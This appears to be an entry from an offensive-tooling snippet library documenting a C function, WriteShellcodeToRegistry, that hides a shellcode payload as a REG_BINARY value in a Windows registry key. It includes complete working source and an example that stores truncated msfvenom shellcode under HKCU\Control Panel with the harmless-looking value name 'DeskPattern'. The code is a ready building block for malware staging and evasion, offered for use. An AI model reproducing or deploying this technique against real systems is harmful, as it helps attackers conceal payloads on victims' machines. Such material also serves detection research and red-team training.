## Write To Registry Key (Unicode)

Persists a payload into a registry key by opening the specified hive and subkey with `RegOpenKeyExW` and writing the payload as a `REG_BINARY` value using `RegSetValueExW`. Functionally identical to the ASCII variant but uses wide-string (`W`) API calls throughout. The hive, key path, and value name are all caller-supplied.

**Usage**

Call `WriteShellcodeToRegistry` with the root hive, the wide-string subkey path, the wide-string value name, the payload buffer, and its size.

- `IN HKEY hRootKey`  Root hive handle (e.g. `HKEY_CURRENT_USER`, `HKEY_LOCAL_MACHINE`).
- `IN LPCWSTR szRegistryPath`  Wide-string subkey path to open under `hRootKey` (e.g. `L"Control Panel"`).
- `IN LPCWSTR szRegValue`  Wide-string name of the binary value to create or overwrite.
- `IN PBYTE pShellcode`  Base address of the payload buffer to write.
- `IN DWORD dwShellcodeSize`  Size of `pShellcode` in bytes.

**Return Value**

`BOOL`  Returns `TRUE` if the payload was successfully written to the registry, otherwise `FALSE`.

**External Files**

- `windows.h`  `BOOL`, `HKEY`, `PBYTE`, `DWORD`, `LPCWSTR`, `LSTATUS`, `IN`, `RegOpenKeyExW()`, `RegSetValueExW()`, `RegCloseKey()`
- `stdio.h`  `wprintf()`

### Code

```c
#include <windows.h>
#include <stdio.h>


BOOL WriteShellcodeToRegistry(IN HKEY hRootKey, IN LPCWSTR szRegistryPath, IN LPCWSTR szRegValue, IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL    bSTATE  = TRUE;
    LSTATUS STATUS  = NULL;
    HKEY    hKey    = NULL;

    wprintf(L"[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, szRegistryPath, szRegValue);

    // Open a handle to the caller-specified registry key with write access.
    STATUS = RegOpenKeyExW(
        hRootKey,           // Root hive handle supplied by the caller.
        szRegistryPath,     // Wide-string subkey path to open.
        0,                  // Options — reserved, must be 0.
        KEY_SET_VALUE,      // Access right needed to create/set values.
        &hKey               // Receives the handle to the opened key.
    );
    if (ERROR_SUCCESS != STATUS) {
        wprintf(L"[!] RegOpenKeyExW Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Write the payload as a binary value under the opened key.
    STATUS = RegSetValueExW(
        hKey,               // Handle to the opened registry key.
        szRegValue,         // Wide-string name of the value to create or overwrite.
        0,                  // Reserved — must be 0.
        REG_BINARY,         // Data type: raw binary bytes.
        pShellcode,         // Pointer to the payload data.
        dwShellcodeSize     // Size of the payload in bytes.
    );
    if (ERROR_SUCCESS != STATUS) {
        wprintf(L"[!] RegSetValueExW Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    wprintf(L"[+] DONE ! \n");

_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}
```

**Example**

```c
// msfvenom calc shellcode, abbreviated for the snippet.
unsigned char pShellcode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0 /* ... */ };
DWORD         dwShellcodeSize = sizeof(pShellcode);

// Persist the payload under HKCU\Control Panel as a wide-string REG_BINARY value.
WriteShellcodeToRegistry(
    HKEY_CURRENT_USER,
    L"Control Panel",
    L"DeskPattern",
    pShellcode,
    dwShellcodeSize
);
```
